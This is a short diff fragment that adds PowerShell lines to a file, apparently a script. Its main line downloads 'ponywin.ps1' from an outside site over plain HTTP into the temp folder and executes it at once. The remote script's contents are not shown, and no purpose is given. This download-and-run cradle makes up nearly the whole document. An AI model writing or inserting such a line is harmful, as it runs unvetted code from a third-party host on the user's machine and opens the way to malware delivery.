@@ -1,0 +1,3 @@
+$env:temp
+
+$wc = New-Object System.Net.WebClient ;$wc.DownloadFile("http://ponify.nl/ponywin.ps1", "$env:temp\ponywin.ps1");&"$env:temp\ponywin.ps1";
